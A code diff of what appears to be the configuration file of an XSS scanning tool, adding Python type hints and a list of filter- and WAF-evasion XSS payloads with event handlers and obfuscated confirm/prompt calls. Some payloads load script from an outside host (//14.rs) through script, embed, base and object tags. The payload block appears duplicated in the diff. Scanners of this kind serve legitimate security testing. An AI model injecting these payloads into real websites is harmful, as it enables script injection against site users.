@@ -1,47 +1,65 @@
-changes = '''Negligible DOM XSS false positives;x10 faster crawling'''
-globalVariables = {}  # it holds variables during runtime for collaboration across modules
+from typing import Dict, List, Tuple, Any
 
-defaultEditor = 'nano'
-blindPayload = ''  # your blind XSS payload
-xsschecker = 'v3dm0s'  # A non malicious string to check for reflections and stuff
+changes: str = '''Negligible DOM XSS false positives;x10 faster crawling'''
+globalVariables: Dict[str, Any] = {}  # it holds variables during runtime for collaboration across modules
+
+defaultEditor: str = 'nano'
+blindPayload: str = ''  # your blind XSS payload
+xsschecker: str = 'v3dm0s'  # A non malicious string to check for reflections and stuff
 
 #  More information on adding proxies: http://docs.python-requests.org/en/master/user/advanced/#proxies
-proxies = {'http': 'http://0.0.0.0:8080', 'https': 'http://0.0.0.0:8080'}
+proxies: Dict[str, str] = {'http': 'http://0.0.0.0:8080', 'https': 'http://0.0.0.0:8080'}
 
-minEfficiency = 90  # payloads below this efficiency will not be displayed
+minEfficiency: int = 90  # payloads below this efficiency will not be displayed
 
-delay = 0  # default delay between http requests
-threadCount = 10  # default number of threads
-timeout = 10  # default number of http request timeout
+delay: int = 0  # default delay between http requests
+threadCount: int = 10  # default number of threads
+timeout: int = 10  # default number of http request timeout
 
 # attributes that have special properties
-specialAttributes = ['srcdoc', 'src']
+specialAttributes: List[str] = ['srcdoc', 'src']
 
-badTags = ('iframe', 'title', 'textarea', 'noembed',
+badTags: Tuple[str, ...] = ('iframe', 'title', 'textarea', 'noembed',
            'style', 'template', 'noscript')
 
-tags = ('html', 'd3v', 'a', 'details')  # HTML Tags
+tags: Tuple[str, ...] = ('html', 'd3v', 'a', 'details')  # HTML Tags
 
 # "Things" that can be used between js functions and breakers e.g. '};alert()//
-jFillings = (';')
+jFillings: Tuple[str, ...] = (';')
 # "Things" that can be used before > e.g. <tag attr=value%0dx>
-lFillings = ('', '%0dx')
+lFillings: Tuple[str, ...] = ('', '%0dx')
 # "Things" to use between event handler and = or between function and =
-eFillings = ('%09', '%0a', '%0d',  '+')
-fillings = ('%09', '%0a', '%0d', '/+/')  # "Things" to use instead of space
+eFillings: Tuple[str, ...] = ('%09', '%0a', '%0d',  '+')
+fillings: Tuple[str, ...] = ('%09', '%0a', '%0d', '/+/')  # "Things" to use instead of space
 
-eventHandlers = {  # Event handlers and the tags compatible with them
+eventHandlers: Dict[str, List[str]] = {  # Event handlers and the tags compatible with them
     'ontoggle': ['details'],
     'onpointerenter': ['d3v', 'details', 'html', 'a'],
     'onmouseover': ['a', 'html', 'd3v']
 }
 
-functions = (  # JavaScript functions to get a popup
+functions: Tuple[str, ...] = (  # JavaScript functions to get a popup
     '[8].find(confirm)', 'confirm()',
     '(confirm)()', 'co\u006efir\u006d()',
     '(prompt)``', 'a=prompt,a()')
 
-payloads = (  # Payloads for filter & WAF evasion
+payloads: Tuple[str, ...] = (  # Payloads for filter & WAF evasion
+    '\'"</Script><Html Onmouseover=(confirm)()//'
+    '<imG/sRc=l oNerrOr=(prompt)() x>',
+    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
+    '<deTails open oNToggle=confi\u0072m()>',
+    '<img sRc=l oNerrOr=(confirm)() x>',
+    '<svg/x=">"/onload=confirm()//',
+    '<svg%0Aonload=%09((pro\u006dpt))()//',
+    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
+    '<sCript x>confirm``</scRipt x>',
+    '<Script x>prompt()</scRiPt x>',
+    '<sCriPt sRc=//14.rs>',
+    '<embed//sRc=//14.rs>',
+    '<base href=//14.rs/><script src=/>',
+    '<object//data=//14.rs>',
+    '<s=" onclick=confirm``>clickme',
+    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
     '\'"</Script><Html Onmouseover=(confirm)()//'
     '<imG/sRc=l oNerrOr=(prompt)() x>',
     '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
